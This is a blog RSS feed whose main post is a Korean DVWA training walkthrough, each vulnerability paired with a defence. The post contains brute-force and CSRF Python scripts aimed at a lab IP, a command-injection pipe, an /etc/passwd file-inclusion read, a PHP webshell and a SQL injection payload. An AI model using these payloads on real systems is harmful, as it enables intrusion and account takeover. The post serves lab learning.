<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>JHYEON BLOG</title>
    <link>https://blog.jhyeon.dev/</link>
    
    <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>정동현(JHYEON BLOG)</description>
    <pubDate>Tue, 19 Jan 2021 15:00:00 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>OWASP TOP 10 2021 제안 자료</title>
      <link>https://blog.jhyeon.dev/2021/01/20/owasp2021-210120/</link>
      <guid>https://blog.jhyeon.dev/2021/01/20/owasp2021-210120/</guid>
      <pubDate>Tue, 19 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;4년마다 OWASP 에서는 웹 애플리케이션에서 발생한 주요 취약점 리스트(top 10/category) 정보를 주는데,&lt;/p&gt;
&lt;p&gt;올해에도 제안 자료가 있어서 링크를 남겨본다. (공식 정보는 아닙니당)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https:/</description>
        
      
      
      
      <content:encoded><![CDATA[<p>4년마다 OWASP 에서는 웹 애플리케이션에서 발생한 주요 취약점 리스트(top 10/category) 정보를 주는데,</p><p>올해에도 제안 자료가 있어서 링크를 남겨본다. (공식 정보는 아닙니당)</p><p><a href="https://lab.wallarm.com/owasp-top-10-2021-proposal-based-on-a-statistical-data/?amp&amp;fbclid=IwAR1oIWYr_bXxragBk1OJEX4WasafYOUbyv-61z5wAKicIa6RwuPlJbxJnrc">https://lab.wallarm.com/owasp-top-10-2021-proposal-based-on-a-statistical-data/?amp&amp;fbclid=IwAR1oIWYr_bXxragBk1OJEX4WasafYOUbyv-61z5wAKicIa6RwuPlJbxJnrc</a></p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li>Play The Web</li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/OWASP/">OWASP</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/20/owasp2021-210120/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>DVWA 웹 취약점 모의 훈련 도구 리뷰</title>
      <link>https://blog.jhyeon.dev/2021/01/19/dvwa-review-210119/</link>
      <guid>https://blog.jhyeon.dev/2021/01/19/dvwa-review-210119/</guid>
      <pubDate>Mon, 18 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;DVWA는 웹 취약점 모의 해킹(훈련) 도구이며 다운로드는 아래 링크에서 가능합니다.&lt;/p&gt;
&lt;ul&gt;
&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>DVWA는 웹 취약점 모의 해킹(훈련) 도구이며 다운로드는 아래 링크에서 가능합니다.</p><ul><li><p><a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk</a></p></li><li><p>해당 포스트에서는 초심자인 easy 난이도와 대응 방안에 대해서만 작성합니다.</p></li><li><p>기능 별 순차적으로 업데이트 할 예정입니다!</p></li></ul><hr><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>해당 문제는 제목 답게 “Brute Force(무차별 대입 공격)” 기법을 사용하는 문제이다.</p><img src="/img/post/dvwa/bruteforce.png" class="lazyload" data-srcset="/img/post/dvwa/bruteforce.png" srcset="data:image/png;base64,666"><p>그냥 평범하게 로그인 창이 있는데, 공격 벡터는 두군데 밖에 없다. (아이디 / 패스워드 입력폼)</p><p>사용자로부터 입력을 받는 폼에서 이제 무차별 대입 공격 기법을 시도하여 계정을 알아내는 방식이다.</p><pre><code class="php">&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;     // Get username     $user = $_GET[ &#39;username&#39; ];     // Get password     $pass = $_GET[ &#39;password&#39; ];     $pass = md5( $pass );     // Check the database     $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;     $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;         // Get users details         $row    = mysqli_fetch_assoc( $result );         $avatar = $row[&quot;avatar&quot;];         // Login successful         echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;         echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;     &#125;     else &#123;         // Login failed         echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;     &#125;     ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; </code></pre><p>로직은 매우 간단하다. POST 방식으로 넘어온 username, password 값을 받아서 각각 $user, $pass 변수에 저장한다.</p><pre><code class="php">    // Check the database     $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;     $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );</code></pre><p>이후 넘어온 $user(username) 값과 $pass(password) 값을 users 테이블과 매칭해 데이터가 있는지 조회하는 쿼리문을 작성했다.</p><p>일치하는 정보가 있으면 login successful 로 넘어갈 것이고, 없거나 하나라도 틀린정보가 있다면 login failed 로직쪽으로 넘어갈 것이다.</p><p>해당 단계는 아래 python 코드를 사용하여 풀이할 수 있다.</p><pre><code class="py">#!/usr/bin/python3import requestsfrom time import sleepurl = &quot;http://192.168.25.60:4731/vulnerabilities/brute/&quot;session = &#123;&quot;PHPSESSID&quot;:&quot;sessionid&quot;,&quot;security&quot;:&quot;low&quot;&#125;with open(&#39;password.txt&#39;) as f:    while True:        line = f.readline().splitlines()        param = &#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:line, &quot;Login&quot;:&quot;Login&quot;&#125;        r = requests.get(url, params=param, cookies=session)        sleep(1)        if(&quot;Welcome to the password protected area admin&quot; in r.text):            print(&quot;password matching!!&quot;,line)        else:            print(&quot;not match&quot;)        if not line:            break</code></pre><p>코드에 사용된 “password.txt”는 github에 검색좀 해보면 나오는 리스트들이다.</p><p>이러한 비밀번호 리스트들을 사용해서 한줄씩 대입을 하여 로그인이 됐을 때의 상태 / 실패했을 때의 상태를 체크해서</p><p>문제를 풀어주면 된다.</p><hr><h3 id="Brute-Force-대응-방안"><a href="#Brute-Force-대응-방안" class="headerlink" title="Brute Force (대응 방안)"></a>Brute Force (대응 방안)</h3><p>무차별 대입 공격을 막는 방법은 여러가지가 있을 수 있지만</p><p>자동화 도구나 봇을 통해 작업을 하는 것을 차단할 수 있는 “google recapture”를 적용하면 된다.</p><p>또한 연속적으로 시도하지 못하도록 “최대 시도 횟수 제한” 기능을 넣는다면 이런 공격으로부터 방어를 할 수 있지 않나 싶다.</p><hr><h3 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h3><p>커맨드 인젝션(Cmd Injection) 공격은 웹 앱에서 시스템 명령을 사용할 때 적절한 필터링 조치가 되어 있지 않은 경우</p><p>하나의 커맨드안에서 두개의 명령을 실행 해 공격자가 원하는 결과를 얻어낼 수 있는 공격입니다.</p><hr><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    &#125;    else &#123;        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    &#125;    // Feedback for the end user    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt;</code></pre><p>우선 코드를 분석해보면 REQUEST로 사용자로 부터 ip값을 입력받아 $target 변수에 저장하고,</p><p>하단의 shell_exec 시스템 함수로 ping 명령을 수행합니다.</p><p>ex) shell_exec(ping 127.0.0.1)</p><p>ex) shell_exec(ping -c 4 127.0.0.1)</p><p>넘어온 ip를 대입해서 함수를 맞춰보면 이런 구조가 되겠죠.</p><p>다만, 아래와 같이 사용할 경우 커맨드 인젝션이 발생하게 됩니다.</p><pre><code class="bash">ping -c 4 127.0.0.1 | pwd</code></pre><p>127.0.0.1로 핑을 보내는 동시에 뒤에 |(파이프라인)으로 처리된 pwd 명령까지 함께 실행하게 됩니다.</p><p>즉 하나의 커맨드안에서 두개의 명령을 실행하는 것이 가능하다는 의미이죠.</p><p>실무에서는 잘 없겠지만 매~~우매우 취약한 사이트에 이런 기능이 있다고 하면</p><p>공격자가 RCE 환경을 만들어버릴 수 있는 취약점입니다.</p><hr><h3 id="Command-Injection-대응-방안"><a href="#Command-Injection-대응-방안" class="headerlink" title="Command Injection(대응 방안)"></a>Command Injection(대응 방안)</h3><p>제가 생각하기엔, 실무나 회사에서 과연 이런 시스템 함수를 써서 뭔가의 기능을 사용할 일이 있나 싶습니다.</p><p>그러나, 다방면으로 쓰는 분들이 있을 수 있기에 간단한 대응 방안을 나열해봅시다.</p><ol><li><p>특수문자 필터링</p></li><li><p>입력값 regex 정규식 표현 사용</p></li><li><p>화이트 리스트 기반 명령어 실행 (사용할 수 있는 명령어 제한)</p></li></ol><p>뭐 이정도가 될 수 있겠네요 ㅎㅎ..</p><hr><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF(Cross Site Request Forgery)는 공격자가 수정, 삭제 등의 행위를 CSRF 취약점이 발생하는 웹 페이지에,</p><p>요청을 보내 처리하는 방식의 취약점을 의미합니다.</p><p>DVWA에서의 CSRF 폼은 아래와 같습니다.</p><img src="/img/post/dvwa/csrf.png" class="lazyload" data-srcset="/img/post/dvwa/csrf.png" srcset="data:image/png;base64,666"><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) &#123;    // Get input    $pass_new  = $_GET[ &#39;password_new&#39; ];    $pass_conf = $_GET[ &#39;password_conf&#39; ];    // Do the passwords match?    if( $pass_new == $pass_conf ) &#123;        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt;</code></pre><p>소스코드를 분석해보면 간단한 로직으로 기능이 돌아갑니다.</p><p>새 비밀번호, 새 비밀번호 체크 두 가지 값을 입력받아서, 두 값이 같은지 검사한 뒤</p><p>users 테이블의 현재 유저(dvwa 로그인 사용자)에 대한 비밀번호를 업데이트하는 쿼리문을 요청합니다.</p><p>여기서 CSRF 취약점이 어디서 발생하냐 할 수 있는데, 자세히 보면 현재 비밀번호를 변경할 때 입력 값을 통해 바로 업데이트 쿼리문을 수행합니다.</p><p>그럼, 공격자의 입장에서는 비밀번호 변경 페이지에 변경할 비밀번호 값과 함께 요청을 보내는 방식의 공격을 통해 사용자의 비밀번호를 변경이 가능합니다.</p><pre><code class="py">#!/usr/bin/python3import requestsurl = &quot;http://192.168.25.61:4731/vulnerabilities/csrf/&quot;session = &#123;&quot;PHPSESSID&quot;:&quot;sessionid&quot;,&quot;security&quot;:&quot;low&quot;&#125;param = &#123;&quot;password_new&quot;:&quot;0000&quot;, &quot;password_conf&quot;:&quot;0000&quot;, &quot;Change&quot;:&quot;Change&quot;&#125;r = requests.get(url, params=param, cookies=session)if(&quot;Password Changed.&quot; in r.text):    print(&quot;password changed!&quot;)else:    print(&quot;password change failed&quot;)</code></pre><p>python 경우에는 위 코드로 쉽게 수정이 가능합니다.</p><p>해당 방법 이외에도 공격자 입장에서는 가짜 페이지를 만들어서 그쪽으로 유도하거나 이메일 통해서도 공격 시도가 가능하게 됩니다.</p><hr><h3 id="CSRF-대응-방안"><a href="#CSRF-대응-방안" class="headerlink" title="CSRF (대응 방안)"></a>CSRF (대응 방안)</h3><ol><li><p>CSRF TOKEN 추가</p><ul><li><a href="https://portswigger.net/web-security/csrf/tokens">https://portswigger.net/web-security/csrf/tokens</a></li></ul></li><li><p>HTTP Header(Referer) 검증</p><ul><li><a href="https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Referer">https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Referer</a></li></ul></li></ol><hr><h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>File Inclusion이란, LFI(Local FIle Include)와 동일한 개념이라고 생각하면 됩니다.</p><p>즉, 로컬 저장소에 저장된 파일을 페이지에서 불러올 수 있는 취약점입니다.</p><img src="/img/post/dvwa/lfi.png" class="lazyload" data-srcset="/img/post/dvwa/lfi.png" srcset="data:image/png;base64,666"><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];?&gt;</code></pre><p>low 레벨에서는 소스코드가 매우 간단합니다.  page 파라미터를 넘겨받아서 그대로 페이지에 include 해주는 로직입니다.</p><p>그럼 여기서, 페이지에 나와있는 file1, fil2, file3.php는 당연히 로컬 서버의 저장소에 저장이 되어 있겠죠?</p><p>이런 점을 생각해서 다른 로컬 파일들을 읽어오면 됩니다.</p><pre><code class="bash">?page=/etc/passwd?page=/etc/~~...</code></pre><p>LFI를 활용해서는 php 설정 옵션인 <code> allow_url_include </code>가 ON으로 되어 있을 경우</p><p>RFI(Remote File Inclusion) 외부 URL를 읽어서 페이지에 로드하는 것도 가능합니다.</p><p>이에 대해서는 DVWA 리뷰가 아닌 LFI &amp; RCE 라는 주제로 새 포스팅에서 다뤄볼 예정입니다.</p><hr><h3 id="File-Inclusion-대응-방안"><a href="#File-Inclusion-대응-방안" class="headerlink" title="File Inclusion(대응 방안)"></a>File Inclusion(대응 방안)</h3><ol><li><p>php를 사용할 때 외부 파일을 로드하지 못하도록 allow_url_include, url_fopen 옵션 OFF</p></li><li><p>입력값 필터링(preg_match, regex 등)</p></li><li><p>특정 디렉토리에서만 파일을 읽어올 수 있도록 조치</p></li></ol><hr><h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><p>파일 업로드(File Upload) 취약점을 다루는 페이지입니다.</p><p>파일 업로드 취약점은 웹 애플리케이션 내 서버에 파일을 업로드 하는 기능이 있을 때 업로드 하는 파일에 대한 검사를 하지 않고</p><p>서버에 다이렉트로 업로드 되는 경우 공격자가 “웹쉘”, “악성파일” 등을 업로드하여 서버에 접근할 수 있는 취약점 입니다.</p><img src="/img/post/dvwa/upload.png" class="lazyload" data-srcset="/img/post/dvwa/upload.png" srcset="data:image/png;base64,666"><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123;    // Where are we going to be writing to?    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );    // Can we move the file to the upload folder?    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123;        // No        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;    &#125;    else &#123;        // Yes!        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;    &#125;&#125;?&gt;</code></pre><p>코드도 매우 간단합니다. (low 레벨이라. ㅎㅎ) 사용자로 부터 업로드할 파일을 받아서</p><p>DVWA ROOT 경로 -&gt; hackable/uploads 폴더에 파일을 업로드하도록 되어 있네요.</p><p>이 과정에서 파일에 대한 검증 로직이 없기 때문에 위에서 언급했던 웹쉘 업로드가 가능합니다.</p><pre><code class="php">&lt;?php    system($_GET[&#39;cmd&#39;]);?&gt;</code></pre><p>시스템 함수를 사용하여 웹쉘을 만들어주고, 업로드 하면 됩니다.</p><p>저는 shell.php 라는 파일명으로 업로드 하였을 때 (hackable/uploads/shell.php)로 저장이 됩니다.</p><p>그럼 이제 해당 경로로 가서 웹쉘을 실행시켜봅시다.</p><img src="/img/post/dvwa/upload_result.png" class="lazyload" data-srcset="/img/post/dvwa/upload_result.png" srcset="data:image/png;base64,666"><hr><h3 id="File-Upload-대응-방안"><a href="#File-Upload-대응-방안" class="headerlink" title="File Upload (대응 방안)"></a>File Upload (대응 방안)</h3><ol><li><p>업로드 하는 파일의 확장자 검사 또는 화이트 리스트 적용(jpg, png, gif 등)</p></li><li><p>파일 실행권한(x) 제거</p></li><li><p>업로드 시에 파일 경로/파일 명을 알 수 없도록 난독화하여 저장</p></li><li><p>특수문자 필터링</p></li></ol><hr><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>SQL Injection 취약점은 OWASP 에서도 매번 Top 10 이슈에 뜨는 취약점이라고 할 수 있습니다.</p><p>공격자가 취약한 사이트를 대상으로, 악의적인 쿼리를 만들어 요청을 보냄으로써 DB 시스템에 접근, 제어(수정, 삭제, 등록), 조회 등의 행위가 가능하게 됩니다.</p><p>예시로 숙박앱을 운영하는 기업중 한 군데가 SQL Injection 공격을 받아 개인정보가 유출당했던 피해도 있었죠</p><p>아무튼.. 한번 실습으로 떠나봅시다.</p><img src="/img/post/dvwa/sql.png" class="lazyload" data-srcset="/img/post/dvwa/sql.png" srcset="data:image/png;base64,666"><pre><code class="php">&lt;?phpif( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123;    // Get input    $id = $_REQUEST[ &#39;id&#39; ];    // Check database    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    // Get results    while( $row = mysqli_fetch_assoc( $result ) ) &#123;        // Get values        $first = $row[&quot;first_name&quot;];        $last  = $row[&quot;last_name&quot;];        // Feedback for end user        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;    &#125;    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt;</code></pre><p>사용자로부터 입력을 받는 폼은 (id) 부분입니다. 값을 입력받아서 $id 변수에 저장하고, users 테이블에 user_id=$id 인 경우를 조회하게 됩니다.</p><p>그리고 만약 조회된 데이터가 있을 경우 first_name, last_name을 출력해주는 로직입니다.</p><p>어디서 취약점이 발생했을까요?</p><pre><code class="php">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;</code></pre><p>해당 부분을 보면 사용자로부터 입력값이 넘어온 상태에서 그대로 $id 변수에 저장하고 어떠한 검증도 거치지 않습니다.</p><p>그래서 사용자가 어떤 값을 입력하든 모두 쿼리문에 들어간다는 의미로 볼 수 있죠.</p><p>만약 해당 쿼리문의 결과를 무조건 참(True)으로 만든다면 결과는 당연히 조회하는 테이블의 모든 행을 출력할 수 있습니다.</p><p>아래 쿼리를 입력해봅시다.</p><pre><code class="sql">&#39; or 1=1#&#39;</code></pre><img src="/img/post/dvwa/sql2.png" class="lazyload" data-srcset="/img/post/dvwa/sql2.png" srcset="data:image/png;base64,666"><p>조회하는 테이블의 모든 행이 조회가 가능했습니다. 이러한 sql injection 공격의 종류에는 아래와 같이 다양합니다.</p><ol><li><p>nosql injection</p></li><li><p>time based injection</p></li><li><p>blind injection</p></li><li><p>union injection</p></li><li><p>error based injection</p></li></ol><p>…</p><p>나중에 예제를 가지고 포스팅 하겠지만, 이외에도 수많은 공격 기법이 존재함을 알 수 있습니다.</p><hr><h3 id="SQL-Injection-대응-방안"><a href="#SQL-Injection-대응-방안" class="headerlink" title="SQL Injection 대응 방안"></a>SQL Injection 대응 방안</h3><ol><li><p>특수문자 필터링</p></li><li><p>PDO(Prepared Statement) 방식의 코드 작성</p></li><li><p>입력 값 필터링(preg_match)</p></li><li><p>입력 값 치환(addslashes 등의 함수)</p></li></ol><p>사실 PDO 방식으로만 해도 거의 대부분의 인젝션 공격은 막을 수 있다고 봅니다.</p><hr><h3 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h3><p>이번엔, Blind Injection 공격 기법을 알아보겠습니다.</p><p>Blind 의미는 이전의 SQL Injection 단계처럼 화면 상에 결과를 보여주는 것이 아닌</p><p>값이 존재하면 true/false 또는 존재합니다/존재하지 않습니다 등으로 처리하게 됩니다.</p><p>그래서 사용자의 데이터를 이전 방법처럼 시도했을 때는 확인이 불가능합니다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/DVWA/">DVWA</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pentesting/">Pentesting</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/19/dvwa-review-210119/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Mac Big Sur 사용 후기 및 백업의 중요성..</title>
      <link>https://blog.jhyeon.dev/2021/01/18/memo-210118/</link>
      <guid>https://blog.jhyeon.dev/2021/01/18/memo-210118/</guid>
      <pubDate>Sun, 17 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;불과 며칠 전 내 소중한 맥북이 의도치 않은 물리적 파손으로 서비스 센터에 다녀왔다.&lt;/p&gt;
&lt;p&gt;큰 고장은 아니였으나 제일 많이 사용하는 키패드 일부가 파손되서 눈물을 흘리면서 수리를 받아야 겠구나 생각했다.&lt;/p&gt;
&lt;p&gt;그 때 센터 가는김에 </description>
        
      
      
      
      <content:encoded><![CDATA[<p>불과 며칠 전 내 소중한 맥북이 의도치 않은 물리적 파손으로 서비스 센터에 다녀왔다.</p><p>큰 고장은 아니였으나 제일 많이 사용하는 키패드 일부가 파손되서 눈물을 흘리면서 수리를 받아야 겠구나 생각했다.</p><p>그 때 센터 가는김에 시스템 포맷도 한번 해야 겠다고 문득 생각이 들었다. (왜냐.. Big Sur의 고질적 오류)</p><p>맥에서 Big Sur 운영체제가 출시된지 1달?2달 된거같은데 초반기에 “최신버전이 그래도 최고지” 라는 안일한 생각에 업데이트를 했다가</p><p>잦은 오류로 인해 엄청난 고생을 했던 경험이 있다.</p><p>그런데 왠걸, 애플에서 빅서 잡 오류를 고친 11.0.2 버전을 내놓았다. 여기서 또 나는 혹해서 이번엔 고쳐졌겠지 라는 두번째 안일한 생각과,</p><p>주변 사람들이 대부분 고쳐진 것 같은데 라는 의견을 수렴해 또 다시 돌아오지 못할 업데이트 길을 걷고 말았다.</p><p>기쁜 마음으로 새 운영체제를 맞이한 순간 초반에 나를 반겨준 오류들은 고쳐진 것 같으나 다양한 오류들이 아직 남아있었다.</p><p>(페럴 네트워크 오류, 키 입력 문제 등..) 작동해야 할 것들이 안하니깐 슬슬 또 화가 나기 시작했고</p><p>이번에는 새로운 버그인가 싶은 간헐적인 버벅임(랙) 현상이 있었다.</p><p>이런 여러가지 계기를 통해서 수리를 받으러 가면서 포맷도 맡겨버릴려고 중요 문서나 파일들은 클라우드에 백업을 해둔 뒤,</p><p>클라우드 저장소에 폴더만 올라간 것을 확인하고 바로 서비스 센터로 가버렸다. (이 때.. 폴더안에 내용들을 확인했어야 하는데..)</p><p>서비스 맡기니깐 키보드 쪽은 가위식 키보드라서 키캡 부분에 약간 문제가 있는거라 금방 수리된다고 전달 받았고 포맷이 1-2일 정도 걸린다고 하셨다.</p><p>맡기고 나와서 한 1시간쯤 뒤인가 생각보다 포맷이 빨리되서 찾으러 오셔도 된다고 전화가 왔고.. 근처 일보고 있었다가 점심시간 거쳐서 찾으러 갔다.</p><p>그렇게 깔끔하게 포맷된 맥북을 가지고 처음부터 다시 환경 세팅을 하면서 백업 파일도 보는데..</p><p>충격스럽게도 클라우드에 올라간 파일들이 폴더만 올라갔고 안에 내용들이 네트워크 오류로 인해서 하나도 안올라갔던 것이였다.</p><p>사태의 심각성을 깨닫고 최신 백업은 아니지만 예전에 다른곳에 백업해둔 파일을 찾아서 하나씩 복구는 했지만</p><p>최근에 씩 엎고 새로 만든 “블로그” 파일이 전부 날아가서 멘붕이 왔다.</p><p>그래도 블로그에 올라간 포스트들은 github에 public 버전으로 업데이트가 되어있었기에 그나마(?) 다행이라고 생각했다.</p><p>결국 블로그 설정 처음부터 다시하면서 업로드한 포스트들 다 git으로 내려받아서 내용 하나하나 수동 복구를 했다 ^^.</p><p>약 3시간 정도 걸린 것 같은데 삽질도 이런 삽질이 없던 것 같다.</p><h3 id="교훈"><a href="#교훈" class="headerlink" title="교훈"></a>교훈</h3><ul><li><p>백업은 항상 끝까지 잘 확인하자</p></li><li><p>이중 백업도 필수 (이거 안했으면 진짜로 망했다)</p></li><li><p>깃허브가 나를 살렸다</p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Big-Sur/">Big Sur</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Mac-OS/">Mac OS</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Backup/">Backup</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/18/memo-210118/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2021년 IT/보안 분야 전망/동향 자료</title>
      <link>https://blog.jhyeon.dev/2021/01/12/newit-210112/</link>
      <guid>https://blog.jhyeon.dev/2021/01/12/newit-210112/</guid>
      <pubDate>Mon, 11 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;해당 포스트는 노션으로 이전되었습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53&quot;&gt;https://www.notion.so/jhyeon</description>
        
      
      
      
      <content:encoded><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53">https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/">정보보안</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%B5%9C%EC%8B%A0%EB%8F%99%ED%96%A5/">최신동향</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/12/newit-210112/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Ubuntu 20.04 Docker Installation</title>
      <link>https://blog.jhyeon.dev/2021/01/08/docker-install-210108/</link>
      <guid>https://blog.jhyeon.dev/2021/01/08/docker-install-210108/</guid>
      <pubDate>Thu, 07 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Step-1&quot;&gt;&lt;a href=&quot;#Step-1&quot; class=&quot;headerlink&quot; title=&quot;Step 1&quot;&gt;&lt;/a&gt;Step 1&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;우분투 패키지 업데이트를 진행합니다.&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class</description>
        
      
      
      
